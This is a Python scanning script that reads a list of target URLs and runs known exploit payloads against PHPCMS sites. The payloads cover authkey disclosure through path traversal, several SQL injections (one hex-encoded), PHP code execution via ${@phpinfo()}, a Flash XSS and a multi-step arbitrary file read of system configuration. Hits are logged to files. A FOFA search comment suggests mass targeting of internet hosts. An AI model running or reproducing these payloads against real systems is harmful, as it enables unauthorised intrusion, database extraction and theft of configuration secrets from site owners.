
import json
import requests
import re
import urllib,hashlib

#fofa：app="Yonyou-Seeyon-OA" && body="致远协创A6" && host!="gov.cn"

urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\\applist&path=admin"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        m = re.search('(\w{32})', req.text)
        if req.status_code == 200 and m:
            print("[+]存在PHPCMS authkey泄露漏洞...(高危)\tpayload: " + vulnurl + "\tauthkey: " + m.group(1), "red")
            with open('authkey泄露漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_authkey_disclosure漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/digg/digg_add.php?id=1&con=2&digg_mod=digg_data%20WHERE%201=2%20+and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x7e,md5(1234),0x7e)))%20from%20information_schema.tables%20limit%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl, timeout=10, verify=False)
        if r"81dc9bdb52d04dc20036dbd8313ed055" in req.text:
            print("[+]存在PHPCMS digg_add.php SQL注入漏洞...(高危)\t\tpayload: " + vulnurl, "red")
            with open('SQL注入漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_digg_add_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/flash_upload.php?modelid=%30%20%61%6E%64%28%73%65%6C%65%63%74%20%31%20%66%72%6F%6D%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%2C%63%6F%6E%63%61%74%28%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%28%73%65%6C%65%63%74%20%63%6F%6E%63%61%74%28%30%78%37%65%2C%6D%64%35%28%33%2E%31%34%31%35%29%2C%30%78%37%65%29%29%29%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%6C%69%6D%69%74%20%30%2C%31%29%2C%66%6C%6F%6F%72%28%72%61%6E%64%28%30%29%2A%32%29%29%78%20%66%72%6F%6D%20%69%6E%66%6F%72%6D%61%74%69%6F%6E%5F%73%63%68%65%6D%61%2E%74%61%62%6C%65%73%20%67%72%6F%75%70%20%62%79%20%78%29%61%29"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if r"63e1f04640e83605c1d177544a5a0488" in req.text:
            print("[+]存在phpcms2008 flash_upload.php SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('SQL注入漏洞2.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_flash_upload_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    payload = "/yp/product.php?pagesize=${@phpinfo()}"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if r"Configuration File (php.ini) Path" in req.text:
            print("[+]存在phpcms2008 product.php 代码执行漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('代码执行漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_product_code_exec漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    flash_md5 = "cf00b069e36e756705c49b3a3bf20c40"
    payload = "/statics/js/ckeditor/plugins/flashplayer/player/player.swf?skin=skin.swf&stream=\%22))}catch(e){alert(1)}//"
    vulnurl = url + payload
    try:
        req = urllib.request.urlopen(vulnurl)
        data = req.read()
        md5_value = hashlib.md5(data).hexdigest()
        if md5_value in flash_md5:
            print("[+]存在phpcms v9 flash xss漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('xss漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_v9_flash_xss漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    url_prefix = url + "/index.php?m=wap&c=index&a=init&siteid=1"
    tmp_cookie = {}
    try:
        req = requests.get(url_prefix,  timeout=10, verify=False)
        for cookie in req.cookies:
            tmp_cookie = cookie.value
    except:
        pass
    post_data = {
        "userid_flash": tmp_cookie
    }
    url_suffix = url + "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28user%28%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26"
    try:
        req2 = requests.post(url_suffix, data=post_data, timeout=10, verify=False)
        for cookie in req2.cookies:
            tmp_cookie = cookie.value
    except:
        pass

    vulnurl = url + "/index.php?m=content&c=down&a_k=" + str(tmp_cookie)
    try:
        req3 = requests.get(vulnurl,  timeout=10, verify=False)
        if r"XPATH syntax error" in req3.text:
            print("[+]存在phpcms v9.6.0 SQL注入漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('sql漏洞3.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_v96_sqli漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")

    url_preffix = url + "/index.php?m=wap&c=index&a=init&siteid=1"
    siteid = ""
    att_json = ""
    try:
        req1 = requests.get(url_preffix,  timeout=10, verify=False)
        for cookie in req1.cookies:
            siteid = cookie.value
        payload = "/index.php?m=attachment&c=attachments&a=swfupload_json&aid=1&filename=test.jpg&src=%26i%3D3%26d%3D1%26t%3D9999999999%26catid%3D1%26ip%3D8.8.8.8%26m%3D3%26modelid%3D3%26s%3Dcaches%2fconfigs%2fsystem.p%26f%3Dh%25253Cp%26xxxx%3D"
        vulnurl = url + payload
        post_data = {
            "userid_flash": siteid
        }
        req2 = requests.post(vulnurl, data=post_data,  timeout=10, verify=False)
        for cookie in req2.cookies:
            att_json = cookie.value
        req3 = requests.get(url + "/index.php?m=content&c=down&a=init&a_k=" + att_json,timeout=10, verify=False)
        pattern = '<a.*?href="(.*?)".*?>.*?</a>'
        link = re.search(pattern, req3.text).group(1)
        req4 = requests.get(url + "/index.php" + link,  verify=False)
        if r"<?php" in req4.text and r"phpsso" in req4.text:
            print("[+]存在phpcms 9.6.1任意文件读取漏洞...(高危)\tpayload: " + vulnurl, "red")
            with open('任意文件读取漏洞.txt', 'a')as f:
                f.write(str(vulnurl) + '\n')
        else:
            print("[-]不存在phpcms_v961_fileread漏洞", "white", "on_grey")

    except:
        print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")